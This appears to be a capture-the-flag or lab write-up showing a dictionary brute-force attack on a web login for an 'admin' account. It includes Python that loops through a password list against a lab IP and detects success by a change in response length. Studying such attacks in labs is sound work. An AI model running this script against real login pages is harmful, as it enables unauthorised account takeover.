# Brute force login

### Introduction
Brute forcing involves attempting multiple combinations of passwords for a specific user until the correct password is discovered, granting access to the user's account.

### Procedure
Numerous brute force techniques exist, and our focus lies on the dictionary attack. This method involves systematically testing a list of potential passwords one by one until the correct password is successfully identified.

To accomplish this, we have created a small Python program, ``brute_force.py``, which attempts to authenticate to the ``admin`` account by testing passwords from a dictionary named ``dictionary.txt``. This dictionary contains the most popular passwords used by users in 2014.

### Program
We first starts by converting the lines of our dictionary into a list. This will allow us to successively trying each password from our list. 
```` python
def read_file(path: str):
	with open(path, 'r') as file:
		lines = []

		for line in file:
			lines.append(line.strip())

	return lines
````

Then, for each password in that list, we send a request to the server with the username ``admin`` using the function ``try_authentication``. Every time we attempt an incorrect password, the server responds with a specific length, in our case, 1988 characters. By recognizing this pattern, we can determine the correctness of a password based on the length of the response. Therefore, if a response has a different number of characters than 1988, we know the password is correct.
``` python
def try_authentication(wrong_request_length: int, username: str, password: str):
  print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
  params = {
		'page': 'signin',
		'username': username,
		'password': password,
		'Login': 'Login'
	}

	encoded_params = urllib.parse.urlencode(params)

	url = 'http://192.168.56.2/?{}'.format(encoded_params)

	response = requests.get(url)
	success = len(response.text) != wrong_request_length
	print(success)

	return success, response.text
```

Once we find the correct password by print the response containing the flag we are looking for.
```python
for password in passwords:
	success, response = try_authentication(wrong_request_length, username, password)

	if success:
		print(response)
		return
```